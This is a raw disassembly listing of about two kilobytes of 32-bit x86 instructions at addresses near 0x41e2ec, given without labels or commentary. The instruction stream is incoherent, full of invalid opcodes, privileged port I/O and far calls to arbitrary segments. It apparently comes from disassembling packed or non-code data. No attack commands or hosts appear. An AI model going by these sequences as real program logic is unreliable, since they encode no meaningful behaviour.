  41e2ec:	ret    0xadad
  41e2ef:	add    esi,edi
  41e2f1:	imul   ebp,DWORD PTR gs:[ebx],0xf231e1ec
  41e2f8:	jbe    0x41e2d5
  41e2fa:	retf   0xc52f
  41e2fd:	imul   edx,esp,0x59
  41e300:	nop
  41e301:	or     ecx,ebx
  41e303:	add    BYTE PTR [edi-0x3d24f4fe],dl
  41e309:	dec    ebp
  41e30a:	sar    DWORD PTR [ecx+0x5222ed77],0xff
  41e311:	mov    dh,0x6d
  41e313:	ins    DWORD PTR es:[edi],dx
  41e314:	jmp    0x31fb8d12
  41e319:	into   
  41e31a:	push   ebx
  41e31b:	mov    ecx,0xdb416683
  41e320:	ret    0xc2c6
  41e323:	aaa    
  41e324:	sub    edx,DWORD PTR [edx]
  41e326:	aad    0x48
  41e328:	jg     0x41e2d5
  41e32a:	push   esi
  41e32b:	sub    al,0x85
  41e32d:	in     eax,dx
  41e32e:	(bad)  
  41e32f:	mov    dh,0x45
  41e331:	jmp    0x53c593ca
  41e336:	in     eax,dx
  41e337:	jmp    0x2dfd0e7d
  41e33c:	sub    al,0x6d
  41e33e:	pop    ecx
  41e33f:	inc    edi
  41e340:	mov    bl,0xcb
  41e342:	push   ss
  41e343:	call   0xbb4:0x539cfb9e
  41e34a:	in     eax,dx
  41e34b:	inc    esi
  41e34c:	outs   dx,DWORD PTR ds:[esi]
  41e34d:	push   ebp
  41e34e:	lods   eax,DWORD PTR ds:[esi]
  41e34f:	cmc    
  41e350:	mov    dl,0x28
  41e352:	and    DWORD PTR [edi+0x2c2c52b6],edi
  41e358:	icebp  
  41e359:	mov    eax,edi
  41e35b:	cmp    eax,0x3717f588
  41e360:	fdiv   DWORD PTR ss:[esi+0x41472e67]
  41e367:	(bad)  
  41e368:	fstp   QWORD PTR [esi+ebx*4+0x6176b762]
  41e36f:	imul   esp,DWORD PTR [eax],0x59
  41e372:	push   edx
  41e373:	call   0x4fd4:0xb908b5d0
  41e37a:	outs   dx,DWORD PTR cs:[esi]
  41e37c:	dec    ebx
  41e37d:	sbb    eax,esi
  41e37f:	sbb    DWORD PTR [edi+0x7e],0x3b
  41e383:	add    BYTE PTR cs:[esi],bl
  41e386:	aas    
  41e387:	push   cs
  41e388:	mov    ebx,0x5fd5b854
  41e38d:	mov    eax,0x95250357
  41e392:	call   0xda591358
  41e397:	ins    DWORD PTR es:[edi],dx
  41e398:	jns    0x41e38a
  41e39a:	add    BYTE PTR [esi-0x72],ah
  41e39d:	gs jbe 0x41e368
  41e3a0:	rcr    DWORD PTR [ebp-0x24950656],1
  41e3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3a7:	add    bh,BYTE PTR [eax+0x41]
  41e3aa:	add    al,0x79
  41e3ac:	push   esi
  41e3ad:	shl    ch,0xdb
  41e3b0:	jbe    0x41e415
  41e3b2:	pop    ebx
  41e3b3:	fidiv  DWORD PTR [eax+0x1b6c9c83]
  41e3b9:	push   es
  41e3ba:	mov    edi,0x853d05ca
  41e3bf:	ins    DWORD PTR es:[edi],dx
  41e3c0:	fisttp DWORD PTR [edx-0x5f]
  41e3c3:	pop    edi
  41e3c4:	arpl   WORD PTR [ebx-0x42],dx
  41e3c7:	jecxz  0x41e410
  41e3c9:	mov    esi,DWORD PTR [edi-0xb5a397b]
  41e3cf:	mov    ecx,0x2e2dbdd2
  41e3d4:	cmp    ebp,DWORD PTR [ebx+0x38]
  41e3d7:	and    DWORD PTR [ecx+esi*2-0x4c8de407],edi
  41e3de:	add    BYTE PTR [ebx+0x74],bh
  41e3e1:	add    BYTE PTR [ebx+0x50ed8171],ch
  41e3e7:	add    BYTE PTR [esi-0x491f848b],bl
  41e3ed:	xor    BYTE PTR [ebx-0x3866b6a4],bl
  41e3f3:	je     0x41e438
  41e3f5:	std    
  41e3f6:	in     eax,0xc2
  41e3f8:	push   esi
  41e3f9:	mov    esi,0xf300715b
  41e3fe:	popf   
  41e3ff:	adc    DWORD PTR [edi+esi*1],esp
  41e402:	jmp    DWORD PTR [ecx]
  41e404:	mov    cl,0xb1
  41e406:	ins    DWORD PTR es:[edi],dx
  41e407:	or     esi,DWORD PTR [eax-0x60]
  41e40a:	es pop edx
  41e40c:	sub    al,0x61
  41e40e:	fistp  DWORD PTR [ebx-0x4924e572]
  41e414:	jb     0x41e445
  41e416:	inc    edi
  41e417:	mov    edx,0xf2124f1d
  41e41c:	or     ecx,ebx
  41e41e:	fisttp DWORD PTR [ebp+0xe1f60ce]
  41e424:	mov    edi,0x5ff80010
  41e429:	pop    es
  41e42a:	repnz lea esp,[ebp-0x5ec9bb4a]
  41e431:	or     edi,DWORD PTR [ecx-0x7e8d1224]
  41e437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e438:	lea    edx,[eax+0x531a0c12]
  41e43e:	jb     0x41e44f
  41e440:	call   0x34e6:0xa2dadf2d
  41e447:	jbe    0x41e475
  41e449:	add    al,cl
  41e44b:	leave  
  41e44c:	adc    al,0xdb
  41e44e:	mov    dl,0x41
  41e450:	push   edi
  41e451:	shl    eax,0xcb
  41e454:	sub    bl,al
  41e456:	imul   ebp,DWORD PTR [ebx],0xfffffff2
  41e459:	dec    ebx
  41e45a:	pop    ebx
  41e45b:	mov    ch,0x59
  41e45d:	fucomp st(1)
  41e460:	sub    DWORD PTR [ebx],ecx
  41e462:	outs   dx,BYTE PTR ds:[esi]
  41e463:	add    BYTE PTR [ecx+0x19],bh
  41e466:	ret    0xf5b6
  41e469:	aam    0x15
  41e46b:	daa    
  41e46c:	ret    0x427f
  41e46f:	dec    ebp
  41e470:	or     BYTE PTR [esi+0x56],bl
  41e473:	jmp    0x41e447
  41e475:	ret    0x49b4
  41e478:	xchg   edx,eax
  41e479:	lds    ebp,FWORD PTR [edi+ebx*2+0x2ed179e2]
  41e480:	sub    al,0xff
  41e482:	ins    BYTE PTR es:[edi],dx
  41e483:	pop    edx
  41e484:	add    BYTE PTR [ebx],ch
  41e486:	mov    al,ds:0xca60fd00
  41e48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e48c:	and    dh,BYTE PTR ds:0xb6dbb623
  41e492:	sub    DWORD PTR [edi-0x29c4a911],0x59d9bf80
  41e49c:	(bad)  [esi+0xbe1adc2]
  41e4a2:	(bad)  
  41e4a3:	jg     0x41e4cd
  41e4a5:	fwait
  41e4a6:	pop    eax
  41e4a7:	mov    edi,0x976bd4fb
  41e4ac:	mov    dh,0x76
  41e4ae:	inc    BYTE PTR es:0x48a19ef8
  41e4b5:	aas    
  41e4b6:	mov    edi,0xadc2ad8f
  41e4bb:	jne    0x41e471
  41e4bd:	jo     0x41e511
  41e4bf:	mov    edi,0x1af5b60
  41e4c4:	stos   DWORD PTR es:[edi],eax
  41e4c5:	fnsave [esi+0x21151b8d]
  41e4cb:	pop    edi
  41e4cc:	pop    edx
  41e4cd:	mov    eax,ds:0x9102a53a
  41e4d2:	ins    DWORD PTR es:[edi],dx
  41e4d3:	mov    eax,ds:0x1f7aa17c
  41e4d8:	xor    al,BYTE PTR [eax]
  41e4da:	fnstenv [ecx]
  41e4dc:	pop    esi
  41e4dd:	(bad)  
  41e4de:	sbb    eax,0x8d85b70a
  41e4e3:	and    esp,edi
  41e4e5:	adc    al,0xf4
  41e4e7:	cmp    al,ah
  41e4e9:	xchg   ebp,eax
  41e4ea:	ficom  DWORD PTR [ebx]
  41e4ec:	mov    ds:0x7cb71b6d,al
  41e4f1:	and    dh,BYTE PTR [edx+0x2d]
  41e4f4:	push   es
  41e4f5:	mov    edi,0xb6ed6221
  41e4fa:	mov    cl,0xb5
  41e4fc:	sar    BYTE PTR [edi+0x118621fd],0x20
  41e503:	and    eax,0x6dbe5802
  41e508:	ins    DWORD PTR es:[edi],dx
  41e509:	ret    0xb81f
  41e50c:	push   cs
  41e50d:	in     al,dx
  41e50e:	loop   0x41e53a
  41e510:	add    BYTE PTR [edi+0x21],ah
  41e513:	test   DWORD PTR [ebp+0x5b],ebp
  41e516:	pop    eax
  41e517:	sbb    edi,esi
  41e519:	jns    0x41e4ec
  41e51b:	or     BYTE PTR [ecx+ebp*1-0x65],ah
  41e51f:	sub    ebp,DWORD PTR [si-0x49]
  41e523:	shr    BYTE PTR [esi],cl
  41e525:	and    eax,ebp
  41e527:	cmp    esi,DWORD PTR [ecx+ecx*2+0x591f7832]
  41e52e:	mov    es,WORD PTR [ebp-0x5adf9c93]
  41e534:	jae    0x41e519
  41e536:	in     al,dx
  41e537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e538:	aaa    
  41e539:	or     al,0x6d
  41e53b:	mov    ebx,0x4746db4
  41e540:	pop    edi
  41e541:	stos   DWORD PTR es:[edi],eax
  41e542:	into   
  41e543:	pushf  
  41e544:	push   cs
  41e545:	dec    edx
  41e546:	je     0x41e54d
  41e548:	mov    dh,0x29
  41e54a:	outs   dx,BYTE PTR ds:[esi]
  41e54b:	or     ebx,ecx
  41e54d:	fsub   st(7),st
  41e54f:	add    al,0x3e
  41e551:	scas   eax,DWORD PTR es:[edi]
  41e552:	jle    0x41e595
  41e554:	stos   BYTE PTR es:[edi],al
  41e555:	mov    dh,0x5d
  41e557:	fdiv   DWORD PTR [esi+0x32804e65]
  41e55d:	or     eax,0x2d9579d4
  41e562:	into   
  41e563:	imul   esp,DWORD PTR [ebx-0x7d],0x5edf4ad
  41e56a:	mov    dl,0x6
  41e56c:	hlt    
  41e56d:	aam    0x6b
  41e56f:	(bad)  [esi+0x59aa3f76]
  41e575:	stos   BYTE PTR es:[edi],al
  41e576:	pop    ss
  41e577:	add    eax,0x49475c18
  41e57c:	fnsave [esi-0x26cb9e8a]
  41e582:	pop    es
  41e583:	inc    eax
  41e584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e585:	cmc    
  41e586:	inc    eax
  41e587:	(bad)  
  41e588:	and    al,0xd5
  41e58a:	fcmovnu st,st(2)
  41e58c:	lods   eax,DWORD PTR ds:[esi]
  41e58d:	sub    eax,0xb3cbdc68
  41e592:	mov    al,0x20
  41e594:	gs jno 0x41e5be
  41e597:	cmp    ah,bl
  41e599:	push   ss
  41e59a:	fisub  DWORD PTR [ebp-0x45]
  41e59d:	iret   
  41e59e:	xchg   bl,ah
  41e5a0:	call   0x15b8:0xf4d19e3e
  41e5a7:	outs   dx,DWORD PTR cs:[esi]
  41e5a9:	inc    ebp
  41e5aa:	sub    al,BYTE PTR [eax]
  41e5ac:	inc    ebx
  41e5ad:	add    eax,0x4f954c60
  41e5b2:	out    0xa5,al
  41e5b4:	jbe    0x41e557
  41e5b6:	add    DWORD PTR [eax],esi
  41e5b8:	mov    ds:0x5ffc1a13,eax
  41e5bd:	loopne 0x41e5ff
  41e5bf:	or     esp,ebp
  41e5c1:	fisttp DWORD PTR [eax]
  41e5c3:	rol    BYTE PTR ds:0x6d4a00b0,1
  41e5c9:	add    al,0xa5
  41e5cb:	ss push 0xffffffb7
  41e5ce:	lods   eax,DWORD PTR ds:[esi]
  41e5cf:	cmp    BYTE PTR [ebx],0xd4
  41e5d2:	push   esi
  41e5d3:	push   ss
  41e5d4:	scas   al,BYTE PTR es:[edi]
  41e5d5:	mov    edi,0x5c2a0422
  41e5da:	sub    BYTE PTR [ebx+eiz*2-0x71],bl
  41e5de:	adc    eax,DWORD PTR [edi]
  41e5e0:	out    dx,al
  41e5e1:	add    al,0xac
  41e5e3:	arpl   WORD PTR [ebx+0x68],bx
  41e5e6:	fisttp QWORD PTR [esi-0x2c837abc]
  41e5ec:	and    edi,ebx
  41e5ee:	xchg   ebx,eax
  41e5ef:	adc    bl,dl
  41e5f1:	ret    0x616d
  41e5f4:	mov    esp,0xdcd72f07
  41e5f9:	jbe    0x41e614
  41e5fb:	imul   edi,DWORD PTR [edx-0x5d],0x8816dc2d
  41e602:	imul   BYTE PTR [ecx]
  41e604:	hlt    
  41e605:	(bad)  [esi]
  41e607:	or     DWORD PTR [ebx+0x707ed472],ebx
  41e60d:	arpl   WORD PTR [ecx-0x3a1e0d67],bp
  41e613:	jg     0x41e692
  41e615:	sahf   
  41e616:	sub    al,0xb4
  41e618:	in     eax,dx
  41e619:	mov    dh,0xc5
  41e61b:	rcl    DWORD PTR [ecx],0xe7
  41e61e:	fistp  QWORD PTR [esi]
  41e620:	pop    ebp
  41e621:	push   0x6d6dd9c4
  41e626:	pop    ebx
  41e627:	or     ebp,DWORD PTR [edx]
  41e629:	test   ch,ah
  41e62b:	loop   0x41e607
  41e62d:	xchg   esp,eax
  41e62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e62f:	add    ebp,DWORD PTR [edi]
  41e631:	adc    al,0xb8
  41e633:	mov    al,0x26
  41e635:	addr16 add esi,edx
  41e638:	lea    esp,[edi]
  41e63a:	xchg   edi,eax
  41e63b:	sub    BYTE PTR ds:0x25da1600,0x96
  41e642:	fcom   DWORD PTR [eax+0xbf6e62e]
  41e648:	pop    ds
  41e649:	push   ebx
  41e64a:	test   al,0x76
  41e64c:	pop    ebx
  41e64d:	fisubr DWORD PTR [edx+0x5673d4bb]
  41e653:	jp     0x41e661
  41e655:	adc    DWORD PTR [eax+eax*8+0x1790d6d2],esi
  41e65c:	jne    0x41e5f9
  41e65e:	aaa    
  41e65f:	aad    0x11
  41e661:	sbb    ebx,DWORD PTR [ebx]
  41e663:	ins    DWORD PTR es:[edi],dx
  41e664:	mov    ebx,0xbfd2fa6e
  41e669:	jle    0x41e6d3
  41e66b:	mov    cl,0x60
  41e66d:	stc    
  41e66e:	jnp    0x41e646
  41e670:	inc    edx
  41e671:	fist   DWORD PTR [esi-0x136d1133]
  41e677:	or     esi,ecx
  41e679:	xchg   DWORD PTR [edi],esi
  41e67b:	outs   dx,BYTE PTR ds:[esi]
  41e67c:	dec    ebx
  41e67d:	sbb    ebx,ebx
  41e67f:	xchg   bl,ah
  41e681:	dec    ebx
  41e682:	aas    
  41e683:	std    
  41e684:	cmp    ebp,DWORD PTR [edx+0x34599f02]
  41e68a:	pusha  
  41e68b:	mov    ds:0x27a43523,eax
  41e690:	mov    edi,esp
  41e692:	ins    DWORD PTR es:[edi],dx
  41e693:	or     edi,DWORD PTR [edi]
  41e695:	outs   dx,BYTE PTR ds:[esi]
  41e696:	ss push 0x48fbc3da
  41e69c:	mov    fs,WORD PTR [ecx]
  41e69e:	xchg   ebp,eax
  41e69f:	jl     0x41e6ce
  41e6a1:	mov    ah,0x6d
  41e6a3:	pop    es
  41e6a4:	mov    BYTE PTR [ecx+0x1e],bh
  41e6a7:	add    eax,0xa3016512
  41e6ac:	push   0x29b6ed88
  41e6b1:	call   0xc00862d9
  41e6b6:	inc    ebp
  41e6b7:	lahf   
  41e6b8:	xchg   esi,eax
  41e6b9:	fdiv   QWORD PTR [esi-0x1680a01b]
  41e6bf:	cli    
  41e6c0:	add    BYTE PTR [eax+0x1],dh
  41e6c3:	add    BYTE PTR [ebx+ebx*8-0x1cdc89d4],cl
  41e6ca:	xchg   DWORD PTR [ebp+0x102db5ad],ebp
  41e6d0:	sub    DWORD PTR [esi+0xc0e2e18],esi
  41e6d6:	rol    DWORD PTR ds:0xb9da1637,cl
  41e6dc:	sbb    DWORD PTR ds:0x745a3273,eax
  41e6e2:	mov    dl,0x6f
  41e6e4:	lea    ebx,[ebx+0x3]
  41e6e7:	cmp    al,0x4f
  41e6e9:	lds    esp,FWORD PTR [eax]
  41e6eb:	mov    cl,0x6c
  41e6ed:	out    dx,eax
  41e6ee:	(bad)  
  41e6ef:	bound  eax,QWORD PTR [eax]
  41e6f1:	xchg   esi,eax
  41e6f2:	or     ah,BYTE PTR [ebp+0xb823f2]
  41e6f8:	push   ss
  41e6f9:	pushf  
  41e6fa:	jg     0x41e69d
  41e6fc:	popf   
  41e6fd:	mov    BYTE PTR [ebx+0x13],bl
  41e700:	frstor [ebp-0x18]
  41e703:	dec    ecx
  41e704:	fsub   DWORD PTR [eax+edi*8-0x7a3e24a5]
  41e70b:	ins    DWORD PTR es:[edi],dx
  41e70c:	jmp    0x41e697
  41e70e:	mov    al,ds:0xd42c9abf
  41e713:	popa   
  41e714:	xor    eax,0xd6c2ed71
  41e719:	ss mov esp,0x4dbc7359
  41e71f:	es arpl WORD PTR fs:[esi],sp
  41e723:	pop    esp
  41e724:	mov    bh,0xd0
  41e726:	mov    edx,0x8939206d
  41e72b:	dec    esp
  41e72c:	adc    edi,ebx
  41e72e:	pop    ds
  41e72f:	fdivr  QWORD PTR [ecx+eiz*2-0x7cc9249f]
  41e736:	retf   0x8c20
  41e739:	outs   dx,BYTE PTR gs:[esi]
  41e73b:	inc    eax
  41e73c:	in     al,0xa
  41e73e:	jo     0x41e6eb
  41e740:	je     0x41e7a5
  41e742:	and    al,0x7e
  41e744:	and    dh,BYTE PTR ds:0x36eb7614
  41e74a:	mov    bh,0xd2
  41e74c:	ins    DWORD PTR es:[edi],dx
  41e74d:	stos   DWORD PTR es:[edi],eax
  41e74e:	cmp    ah,BYTE PTR ds:0x8b3fb993
  41e754:	or     ebx,DWORD PTR [edx]
  41e756:	and    BYTE PTR [ebp+eax*4-0x53],0xb6
  41e75b:	cld    
  41e75c:	add    BYTE PTR [ecx],dh
  41e75e:	test   BYTE PTR [eax],0x4a
  41e761:	mov    bl,BYTE PTR [ebp+esi*1+0x70]
  41e765:	add    esi,DWORD PTR [eax-0x57]
  41e768:	fnsave [esi+0x485cc7b6]
  41e76e:	push   0xffffffb8
  41e770:	or     bl,dh
  41e772:	push   ecx
  41e773:	or     eax,DWORD PTR [edi-0x3e]
  41e776:	ret    0x76f2
  41e779:	sbb    al,0xf
  41e77b:	cmp    BYTE PTR [ecx],ah
  41e77d:	add    BYTE PTR [eax+0x6f],ch
  41e780:	(bad)  
  41e782:	aaa    
  41e783:	mov    ebx,0x67ed6d2d
  41e788:	mov    bl,0x6b
  41e78a:	inc    ecx
  41e78b:	adc    eax,0x543b3874
  41e790:	or     DWORD PTR [ebx],0x6d6c2db0
  41e796:	frstor [eax]
  41e798:	jmp    0xa484674c
  41e79d:	inc    eax
  41e79e:	fisubr DWORD PTR [edi+0x37eebb6d]
  41e7a4:	(bad)  
  41e7a5:	cmp    BYTE PTR [ebp+ecx*2+0x38e57fae],bh
  41e7ac:	lds    ecx,FWORD PTR [ebp-0x642297aa]
  41e7b2:	das    
  41e7b3:	push   0x458be897
  41e7b8:	or     ecx,DWORD PTR [ebx+0xb]
  41e7bb:	pop    ebx
  41e7bc:	pop    es
  41e7bd:	fisttp WORD PTR [ecx+0x6d]
  41e7c0:	xor    eax,0xe176f478
  41e7c5:	push   edx
  41e7c6:	(bad)  [esi-0x19c0d12]
  41e7cc:	hlt    
  41e7cd:	adc    eax,0x409f7bd4
  41e7d2:	xchg   esi,eax
  41e7d3:	pop    edx
  41e7d4:	inc    edi
  41e7d5:	ins    DWORD PTR es:[edi],dx
  41e7d6:	popf   
  41e7d7:	dec    ebp
  41e7d8:	fistp  QWORD PTR [ebx+0x475caa1a]
  41e7de:	fld    TBYTE PTR [ebp+0x4077bfdc]
  41e7e4:	(bad)  
  41e7e5:	cmp    BYTE PTR [ebx+ebp*2+0x1b0bdf89],dh
  41e7ec:	fcmovnb st,st(6)
  41e7ee:	mov    bh,0x66
  41e7f0:	mov    BYTE PTR [edi+edx*8-0x6d],al
  41e7f4:	lods   al,BYTE PTR ds:[esi]
  41e7f5:	loop   0x41e7ae
  41e7f7:	lods   eax,DWORD PTR ds:[esi]
  41e7f8:	fnsave [esi+0x290024f2]
  41e7fe:	dec    esi
  41e7ff:	push   eax
  41e800:	mov    ds:0x710a1c95,eax
  41e805:	mov    DWORD PTR [eax+0x6a],ebx
  41e808:	(bad)  [ebp-0x1b9bee52]
  41e80e:	mov    al,0x59
  41e810:	sbb    eax,0xdb760be3
  41e815:	push   0x32c3ab17
  41e81a:	ds push es
  41e81c:	mov    ah,0x6f
  41e81e:	mov    cl,0xf7
  41e820:	jecxz  0x41e805
  41e822:	push   esi
  41e823:	mov    al,ds:0x7df7c1ad
  41e828:	aam    0x12
  41e82a:	popa   
  41e82b:	push   es
  41e82c:	ret    0xd2c6
  41e82f:	inc    esi
  41e830:	scas   al,BYTE PTR es:[edi]
  41e831:	div    dl
  41e833:	cld    
  41e834:	lahf   
  41e835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e836:	push   ebp
  41e837:	push   ss
  41e838:	mov    dh,0x5b
  41e83a:	loope  0x41e84c
  41e83c:	sbb    eax,0x6e240249
  41e841:	repnz nop
  41e843:	jg     0x41e7f3
  41e845:	xor    al,0xb6
  41e847:	fist   DWORD PTR [esi-0x80]
  41e84a:	dec    ebx
  41e84b:	mov    bl,0xd4
  41e84d:	lods   eax,DWORD PTR ds:[esi]
  41e84e:	xchg   ebp,eax
  41e84f:	pop    es
  41e850:	mov    ds:0x2edb42e8,al
  41e855:	xor    esi,esp
  41e857:	mov    ebp,0xc70e015c
  41e85c:	jb     0x41e826
  41e85e:	pop    ebp
  41e85f:	push   0xaceaaa6c
  41e864:	repz dec eax
  41e866:	mov    eax,0xb1b86617
  41e86b:	icebp  
  41e86c:	mov    al,0x9b
  41e86e:	frstor [eax+0x3f1bf0e0]
  41e874:	test   al,0x9e
  41e876:	mov    al,0x5d
  41e878:	push   0xd5aab89f
  41e87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e87e:	test   DWORD PTR [ebp-0x4f98faf3],ebp
  41e884:	adc    eax,0x1207b43e
  41e889:	dec    edx
  41e88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e88b:	lock ins DWORD PTR es:[edi],dx
  41e88d:	sahf   
  41e88e:	xor    BYTE PTR [ecx+0x3c1b4fb5],dh
  41e894:	dec    esi
  41e895:	mov    edi,0x5080381c
  41e89a:	xchg   DWORD PTR [eax-0x4593d2d3],esi
  41e8a0:	or     DWORD PTR ds:0x7db3688c,ecx
  41e8a6:	and    al,0x1a
  41e8a8:	shl    DWORD PTR [esi+0x774ceeb4],0x4a
  41e8af:	idiv   DWORD PTR [esi+0x79]
  41e8b2:	mov    bh,0xc8
  41e8b4:	inc    ecx
  41e8b5:	fcom   QWORD PTR [esi-0x40]
  41e8b8:	lock pop ebp
  41e8ba:	and    BYTE PTR [edi-0x66],ch
  41e8bd:	xor    eax,0xc56b7e50
  41e8c2:	or     bh,bl
  41e8c4:	dec    ebp
  41e8c5:	add    BYTE PTR [esi-0x596f03c4],bl
  41e8cb:	pusha  
  41e8cc:	popa   
  41e8cd:	add    eax,DWORD PTR [esi+0x861d1f3]
  41e8d3:	xchg   ebx,eax
  41e8d4:	sbb    edx,DWORD PTR [edi+0x78ff8dda]
  41e8da:	mov    esi,0x222341fe
  41e8df:	mov    ds:0x2b562290,eax
  41e8e4:	push   0xae347a6c
  41e8e9:	sub    al,0x9d
  41e8eb:	outs   dx,BYTE PTR ss:[esi]
  41e8ed:	sbb    ecx,ebx
  41e8ef:	test   DWORD PTR [edx],edx
  41e8f1:	sysexit 
  41e8f3:	jge    0x41e8e9
  41e8f5:	inc    edx
  41e8f6:	sub    eax,0x56b6dbb9
  41e8fb:	mov    ch,0x3d
  41e8fd:	add    al,0x2c
  41e8ff:	inc    ebp
  41e900:	mov    esp,0x6ddb9be0
  41e905:	arpl   WORD PTR [ebx+0x19],sp
  41e908:	and    al,0xba
  41e90a:	dec    eax
  41e90b:	and    eax,0xd7248d83
  41e910:	sbb    BYTE PTR [esi-0x1093f435],dh
  41e916:	push   ds
  41e917:	test   al,0xb2
  41e919:	add    BYTE PTR [ecx],ch
  41e91b:	in     eax,0xb6
  41e91d:	xchg   edx,eax
  41e91e:	dec    esp
  41e91f:	jmp    0x18139dda
  41e924:	loope  0x41e93a
  41e926:	pop    ss
  41e927:	pop    esi
  41e928:	mov    edi,0x23e9bf71
  41e92d:	outs   dx,BYTE PTR ds:[esi]
  41e92e:	sbb    ebx,DWORD PTR [ebx-0x71]
  41e931:	(bad)  
  41e933:	and    BYTE PTR [ebx],0x76
  41e936:	and    esp,DWORD PTR [ebx]
  41e938:	mov    dh,0x6d
  41e93a:	imul   ebp,DWORD PTR [ecx+0x1701aa21],0x44df773c
  41e944:	mov    BYTE PTR [ebx+0x61],ah
  41e947:	pop    ebx
  41e948:	fcom   DWORD PTR [ebp+0xe5f5e6d]
  41e94e:	call   0x6db6:0x17270c0a
  41e955:	arpl   WORD PTR [edi],di
  41e957:	add    ebp,DWORD PTR [ecx+0x66268c68]
  41e95d:	mul    DWORD PTR [ebp+0x36170a03]
  41e963:	or     cl,BYTE PTR [edi-0x5b]
  41e966:	pop    ebx
  41e967:	mov    esi,0xb17346cb
  41e96c:	loopne 0x41e9d8
  41e96e:	aaa    
  41e96f:	push   edi
  41e970:	xchg   BYTE PTR [esi-0x1a],ah
  41e973:	xchg   esp,eax
  41e974:	ins    DWORD PTR es:[edi],dx
  41e975:	repnz aad 0xb8
  41e978:	sub    eax,0x7ae91eb4
  41e97d:	lock xchg edx,eax
  41e97f:	mov    ebx,0x2817664b
  41e984:	mov    edi,0x59c9242d
  41e989:	test   BYTE PTR [ebx+0x5ab9c000],ah
  41e98f:	cmc    
  41e990:	pop    ds
  41e991:	mov    eax,ds:0x70a176d
  41e996:	mov    eax,0x149ef152
  41e99b:	mov    al,0xd6
  41e99d:	or     ebx,ebx
  41e99f:	test   DWORD PTR [esi+0x13],esi
  41e9a2:	mov    WORD PTR [ebp+eiz*1+0x44],?
  41e9a6:	xor    BYTE PTR ds:0xb6f9b8a1,0xc1
  41e9ad:	(bad)  
  41e9ae:	add    DWORD PTR [ecx+0xbbe02ec],ebx
  41e9b4:	les    ebp,FWORD PTR [esi+0x6c]
  41e9b7:	ins    DWORD PTR es:[edi],dx
  41e9b8:	in     eax,dx
  41e9b9:	ret    0xcd03
  41e9bc:	pop    ebp
  41e9bd:	jbe    0x41e97e
  41e9bf:	sbb    dh,al
  41e9c1:	mov    edi,DWORD PTR [esi]
  41e9c3:	cs adc eax,0x782d6c6e
  41e9c9:	aad    0x41
  41e9cb:	stos   DWORD PTR es:[edi],eax
  41e9cc:	xchg   ecx,eax
  41e9cd:	inc    ecx
  41e9ce:	dec    esi
  41e9cf:	iret   
  41e9d0:	inc    edx
  41e9d1:	mov    ebx,0x2ef1b56d
  41e9d6:	pop    edx
  41e9d7:	dec    bl
  41e9d9:	sub    eax,0xb42ccd41
  41e9de:	in     eax,dx
  41e9df:	mov    BYTE PTR [edx-0x10],0xe
  41e9e3:	repnz push eax
  41e9e5:	xchg   ebx,eax
  41e9e6:	(bad)  
  41e9e9:	mov    dh,0xb0
  41e9eb:	mov    cl,0x6d
  41e9ed:	and    al,0x9f
  41e9ef:	sub    al,0x3a
  41e9f1:	xor    BYTE PTR [esi-0x1f16b4ab],ch
  41e9f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9f8:	in     eax,dx
  41e9f9:	(bad)  
  41e9fa:	mov    ebp,0xc50c2b43
  41e9ff:	sub    BYTE PTR [esi+0x43],ch
  41ea02:	add    bh,ch
  41ea04:	outs   dx,BYTE PTR ds:[esi]
  41ea05:	in     eax,dx
  41ea06:	ret    0xc966
  41ea09:	sub    al,0x95
  41ea0b:	or     eax,0xc2fe3eac
  41ea10:	jg     0x41ea8c
  41ea12:	push   eax
  41ea13:	mov    bh,0xe
  41ea15:	fisub  DWORD PTR [ebx]
  41ea17:	xor    al,0x6a
  41ea19:	dec    edx
  41ea1a:	outs   dx,BYTE PTR ds:[esi]
  41ea1b:	jns    0x41ea26
  41ea1d:	mov    eax,0x174345b1
  41ea22:	icebp  
  41ea23:	pop    edx
  41ea24:	mov    eax,ebx
  41ea26:	dec    esp
  41ea27:	cmp    esi,DWORD PTR [esi+0x156ed6e]
  41ea2d:	mov    al,0xd3
  41ea2f:	xor    ch,BYTE PTR [edi+edx*8]
  41ea32:	fild   DWORD PTR [eax-0x9]
  41ea35:	add    al,0xdb
  41ea37:	mov    dh,0x8d
  41ea39:	jp     0x41ea21
  41ea3b:	js     0x41ea1e
  41ea3d:	dec    edx
  41ea3e:	scas   al,BYTE PTR es:[edi]
  41ea3f:	xchg   ah,dh
  41ea41:	cmc    
  41ea42:	(bad)  
  41ea43:	pusha  
  41ea44:	imul   esp,DWORD PTR [ecx+0x70],0x10
  41ea48:	retf   0x5319
  41ea4b:	ret    0x6ca4
  41ea4e:	ins    BYTE PTR es:[edi],dx
  41ea4f:	in     eax,dx
  41ea50:	(bad)  
  41ea51:	xor    BYTE PTR cs:[ebp+0x4c],cl
  41ea55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea56:	ds jo  0x41ea65
  41ea59:	ins    BYTE PTR es:[edi],dx
  41ea5a:	fidiv  DWORD PTR ss:[esi+0x56547410]
  41ea61:	fsub   QWORD PTR [edx+0x51]
  41ea64:	es ins DWORD PTR es:[edi],dx
  41ea66:	arpl   WORD PTR [ecx-0x25],sp
  41ea69:	je     0x41eac5
  41ea6b:	mov    dh,0x5a
  41ea6d:	mov    esi,0x71222154
  41ea72:	in     eax,dx
  41ea73:	push   edx
  41ea74:	mov    eax,ds:0xefba028b
  41ea79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea7a:	mov    dh,0x93
  41ea7c:	and    al,0x2f
  41ea7e:	or     esi,DWORD PTR [ebx+ecx*2+0x621ec08d]
  41ea85:	cld    
  41ea86:	cdq    
  41ea87:	jmp    0x2d6ecbe0
  41ea8c:	mov    ah,0xb
  41ea8e:	sbb    al,0x58
  41ea90:	loopne 0x41eb09
  41ea92:	sub    BYTE PTR [edx-0x47279fb9],al
  41ea98:	ins    DWORD PTR es:[edi],dx
  41ea99:	sub    al,0x37
